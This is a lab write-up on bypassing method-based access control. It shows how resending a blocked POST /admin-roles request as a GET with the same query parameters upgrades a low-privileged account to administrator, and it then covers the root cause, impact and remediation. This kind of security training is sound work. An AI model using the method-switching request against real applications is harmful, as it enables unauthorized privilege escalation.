# Method-Based Access Control Can Be Circumvented

## Overview

This lab demonstrates a **method-based access control bypass**.

The application correctly restricted an administrative role-management function when it was accessed using `POST`, but failed to apply equivalent authorization checks when the same functionality was invoked using `GET`.

By changing the HTTP method, a low-privileged user was able to upgrade their own account to administrator.

---

## Vulnerability

The administrative function used the following endpoint:

```http
POST /admin-roles HTTP/2
Host: <lab-host>
Cookie: session=<admin-session>
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade
```

The request performed a privileged operation:

```text
Upgrade the selected user's role
```

When the same request was sent using a low-privileged user's session, the operation was blocked.

This confirmed that authorization was enforced for the `POST` request.

---

## Identifying the Weakness

The application was then tested to determine whether the same endpoint supported other HTTP methods.

The request was changed from:

```http
POST /admin-roles
```

to:

```http
GET /admin-roles?username=wiener&action=upgrade
```

using the session cookie belonging to the low-privileged `wiener` account.

---

## Exploitation

The final request was:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <lab-host>
Cookie: session=<wiener-session>
```

The server responded with:

```http
HTTP/2 302 Found
Location: /admin
```

The role upgrade was successfully executed.

The `wiener` account was promoted to administrator despite not having permission to perform administrative actions.

---

## Why the Bypass Worked

The original request used:

```text
POST /admin-roles
```

with parameters in the request body:

```text
username=wiener&action=upgrade
```

The modified request used:

```text
GET /admin-roles
```

with the same parameters in the query string:

```text
?username=wiener&action=upgrade
```

Although the HTTP method changed, the back-end still executed the same business logic.

Conceptually:

```text
POST /admin-roles
        |
        v
Authorization check
        |
        v
Denied for low-privileged user
```

but:

```text
GET /admin-roles?username=wiener&action=upgrade
        |
        v
Missing or inconsistent authorization check
        |
        v
Role upgrade executed
```

The authorization logic was therefore **method-dependent**, while the underlying privileged functionality was accessible through multiple methods.

---

## HTTP Method Semantics

According to HTTP semantics, `GET` is intended to retrieve resources and should not be used to perform state-changing operations.

For example:

```text
GET
→ retrieve data

POST
→ submit data / perform an operation
```

However, HTTP does not technically prevent a server from modifying application state in response to a `GET` request.

If the server-side application accepts:

```http
GET /admin-roles?username=wiener&action=upgrade
```

and executes a database update, the operation will still occur.

The responsibility for enforcing correct HTTP semantics lies with the application.

---

## Root Cause

The vulnerability was caused by **inconsistent authorization enforcement across HTTP methods**.

The application:

1. exposed the same privileged functionality through multiple HTTP methods;
2. enforced access control for `POST`;
3. failed to enforce equivalent access control for `GET`.

Authorization was therefore tied to a specific request method rather than to the underlying privileged action.

---

## Impact

An attacker with a low-privileged account could execute administrative functionality by changing the HTTP method.

Depending on the affected endpoint, this could lead to:

* privilege escalation;
* unauthorized account modification;
* administrative actions;
* data modification or deletion;
* complete compromise of application authorization boundaries.

In this case, the attacker was able to promote their own account to administrator.

---

## Remediation

Authorization checks should be applied consistently regardless of the HTTP method used to reach the functionality.

Recommended controls:

* Perform authorization checks inside the business logic itself.
* Do not rely on the HTTP method as an authorization boundary.
* Explicitly restrict endpoints to the intended HTTP methods.
* Reject unsupported methods instead of routing them to the same functionality.
* Ensure all alternative routes and method handlers enforce identical permission checks.
* Avoid state-changing operations through `GET`.

For example, if role changes should only be performed using `POST`, the application should reject:

```http
GET /admin-roles
```

with an appropriate response such as:

```http
405 Method Not Allowed
```

---

## Key Takeaway

When testing privileged functionality, do not only test the intended HTTP method.

If an endpoint uses:

```http
POST /admin-roles
```

also test whether the same functionality can be reached using methods such as:

```text
GET
PUT
PATCH
DELETE
```

The important question is:

> Is authorization enforced on the privileged action itself, or only on a specific HTTP method?

If authorization behavior changes when the request method changes, a method-based access control bypass may be possible.
